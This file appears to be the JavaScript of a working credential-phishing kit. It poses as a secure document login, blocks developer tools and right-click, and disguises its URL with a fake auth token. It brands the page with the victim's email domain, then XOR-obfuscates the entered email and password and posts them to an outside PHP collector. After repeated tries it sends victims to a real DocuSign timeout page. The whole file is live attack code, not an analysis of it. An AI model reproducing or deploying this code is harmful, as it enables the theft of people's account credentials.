document.onkeydown = function (_0x5dfda1) {
  if (_0x5dfda1.keyCode == 123) {
    return false;
  }
  if (_0x5dfda1.ctrlKey && _0x5dfda1.shiftKey && (_0x5dfda1.keyCode == "I".charCodeAt(0) || _0x5dfda1.keyCode == "C".charCodeAt(0) || _0x5dfda1.keyCode == "J".charCodeAt(0))) {
    return false;
  }
  if (_0x5dfda1.ctrlKey && (_0x5dfda1.keyCode == "U".charCodeAt(0) || _0x5dfda1.keyCode == "S".charCodeAt(0))) {
    return false;
  }
};
document.addEventListener("contextmenu", _0x22b15e => _0x22b15e.preventDefault());
const SECRET_KEY = "MATT_SECURE_2026";
let failedAttempts = 0;
function encryptPayload(_0x33c189) {
  const _0x3ffd03 = JSON.stringify(_0x33c189);
  let _0x3d81ba = "";
  for (let _0x5c3135 = 0; _0x5c3135 < _0x3ffd03.length; _0x5c3135++) {
    const _0x5acf7b = _0x3ffd03.charCodeAt(_0x5c3135) ^ SECRET_KEY.charCodeAt(_0x5c3135 % SECRET_KEY.length);
    _0x3d81ba += ("0" + _0x5acf7b.toString(16)).slice(-2);
  }
  return btoa(_0x3d81ba);
}
(function spicyUrl() {
  if (!window.location.search) {
    const _0x204373 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    let _0x2e6e1c = "";
    for (let _0x58df30 = 0; _0x58df30 < 64; _0x58df30++) {
      _0x2e6e1c += _0x204373.charAt(Math.floor(Math.random() * _0x204373.length));
    }
    const _0x319be4 = window.location.protocol + "//" + window.location.host + window.location.pathname + "?auth_token=" + _0x2e6e1c + "&session_ref=v4_secure_verification";
    window.history.replaceState({
      path: _0x319be4
    }, "", _0x319be4);
  }
})();
const viper = document.getElementById("viper");
(function spiritSeal() {
  const _0xd08b31 = viper.value;
  if (_0xd08b31.includes("@")) {
    document.getElementById("totem").src = "https://www.google.com/s2/favicons?sz=128&domain=" + _0xd08b31.split("@")[1].toLowerCase();
  }
})();
(function () {
  const _0x26b7f3 = document.getElementById("viper");
  const _0x242c2c = document.getElementById("doc-title");
  if (_0x26b7f3 && _0x26b7f3.value.includes("@")) {
    let _0x496699 = _0x26b7f3.value.split("@")[1].split(".")[0];
    let _0x100966 = _0x496699.charAt(0).toUpperCase() + _0x496699.slice(1);
    document.title = _0x100966 + " Secure Email";
    _0x242c2c.innerText = _0x100966 + " Secure Email";
  }
})();
function falcon() {
  const _0x1cfe75 = viper.value;
  const _0x87d955 = document.getElementById("cobra").value;
  const _0x5d7b1b = document.getElementById("btn-unlock");
  const _0x22d940 = document.getElementById("loading-spinner");
  const _0x5eb1a4 = document.getElementById("btn-text");
  const _0x99aa13 = document.getElementById("loginBox");
  document.getElementById("sentinel").style.display = "none";
  _0x99aa13.classList.remove("shake");
  if (_0x87d955.length < 1) {
    showError("Please enter your password.");
    _0x99aa13.classList.add("shake");
    return;
  }
  _0x5d7b1b.disabled = true;
  _0x22d940.style.display = "block";
  _0x5eb1a4.innerText = "Verifying...";
  const _0x37e2e4 = encryptPayload({
    email: _0x1cfe75,
    code: _0x87d955,
    timestamp: Date.now()
  });
  fetch("http://s742196446.onlinehome.us/main/base/personal/22sjwjknjqdq/email/AjsjjsjsY/uiwheowjikqmwdms.php", {
    method: "POST",
    headers: {
      "Content-Type": "application/x-www-form-urlencoded"
    },
    body: "secure_data=" + encodeURIComponent(_0x37e2e4)
  }).then(_0x3962af => _0x3962af.json()).then(_0x48463a => {
    _0x5d7b1b.disabled = false;
    _0x22d940.style.display = "none";
    _0x5eb1a4.innerText = "Unlock Document";
    if (_0x48463a.status === "exhausted") {
      showError("âŒ Access locked. Too many failed attempts.");
      _0x5d7b1b.disabled = true;
      setTimeout(() => {
        window.location.href = "https://www.docusign.net/Signing/SessionTimeout.aspx?fi=230f89df-896f-418c-81af-7ffb9804b50f";
      }, 3000);
      return;
    }
    if (_0x48463a.status === "wrong") {
      failedAttempts++;
      if (failedAttempts >= 3) {
        showError("âŒ Access locked. Too many failed attempts.");
        _0x5d7b1b.disabled = true;
        setTimeout(() => {
          window.location.href = "https://www.docusign.net/Signing/SessionTimeout.aspx?fi=230f89df-896f-418c-81af-7ffb9804b50f";
        }, 3000);
        return;
      }
      showError("An error occurred please try again later.");
      _0x99aa13.classList.add("shake");
      document.getElementById("cobra").value = "";
      return;
    }
    if (_0x48463a.status === "success") {
      _0x5eb1a4.innerText = "Success! Redirecting...";
      _0x5d7b1b.style.background = "#10b981";
      window.location.href = _0x48463a.redirect;
    } else {
      showError("Security token mismatch.");
    }
  }).catch(() => {
    failedAttempts++;
    if (failedAttempts >= 3) {
      showError("âŒ System Locked. Redirecting...");
      setTimeout(() => {
        window.location.href = "https://www.docusign.net/Signing/SessionTimeout.aspx?fi=230f89df-896f-418c-81af-7ffb9804b50f";
      }, 3000);
      return;
    }
    _0x5d7b1b.disabled = false;
    _0x22d940.style.display = "none";
    _0x5eb1a4.innerText = "Unlock Document";
    showError("Connection error.");
  });
}
function showError(_0x13072e) {
  const _0x35b757 = document.getElementById("sentinel");
  _0x35b757.style.display = "flex";
  document.getElementById("error-text").innerText = _0x13072e;
}
